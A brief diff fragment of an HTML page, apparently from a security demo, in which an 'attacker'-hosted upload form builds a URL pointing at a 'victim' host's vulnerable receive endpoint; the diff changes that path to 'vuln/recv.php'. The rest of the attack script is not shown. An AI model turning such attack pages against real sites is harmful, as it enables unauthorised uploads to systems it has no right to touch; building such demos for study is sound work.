@@ -15,7 +15,7 @@ body {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-s
 <textarea cols=80 rows=10 name="contents"></textarea><br />
 <button type="button" id="upload" onclick="start()">Upload</button>
 <script>
-var logUrl = window.location.href.replace('attacker', 'victim').replace('evil/upload.html','recv.php');
+var logUrl = window.location.href.replace('attacker', 'victim').replace('evil/upload.html','vuln/recv.php');
 
 function rawUpload(file, fileName) {
     var reader = new FileReader();
